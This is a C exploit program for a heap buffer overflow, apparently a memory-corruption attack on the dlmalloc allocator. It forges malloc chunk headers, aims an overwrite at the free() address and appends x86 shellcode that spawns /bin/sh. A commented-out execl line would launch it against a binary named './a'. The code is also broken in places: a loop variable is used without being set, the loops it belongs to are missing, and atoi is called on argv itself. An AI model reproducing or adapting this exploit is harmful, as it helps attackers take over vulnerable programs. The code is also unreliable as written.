 #include <stdio.h>


main(int argc,char **argv)
{
    unsigned long sysaddr=0x0804968c-12;  /* free() address-16-4 */
    unsigned long retaddr;                /* shellcode address */
    int i;
    char buf[1000];
    char shellcode[] =
         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0"
         "\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
         "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

    strcpy(buf,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    /* 56 chars */
    strcat(buf,"\xf0\xff\xff\xff");                   /* [previous size of buf2] */
    strcat(buf,"\xfc\xff\xff\xff");                   /* [size of buf2] */
    strcat(buf,"\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc");   /* 8 bytes of shit */
    strcat(buf,"\xfc\xff\xff\xff");                   /* [ptr safe 4 bytes] */
    strcat(buf,"\xfc\xff\xff\xff");                   /* [ptr safe 4 bytes] */
    buf[56+4+4+8+4+4 + i] = ((unsigned long)sysaddr >> (i * 8)) & 255;
    /* [ptr to overwrite lоcation - bufsize1 -4] */
    retaddr=sysaddr+atoi(argv);
    buf[56+4+4+8+4+4+4+ i] = ((unsigned long)retaddr >> (i * 8)) & 255;
    strcat(buf,"\xeb\x0c\x90\x90"); /* jump ahead 12 bytes */
    strcat(buf,"\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc");
    /* [bufsize1-4 bytes of crap] */
    strcat(buf,shellcode); /* shellcode */

    //execl("./a","a",buf, NULL); /* blow them baby */
}
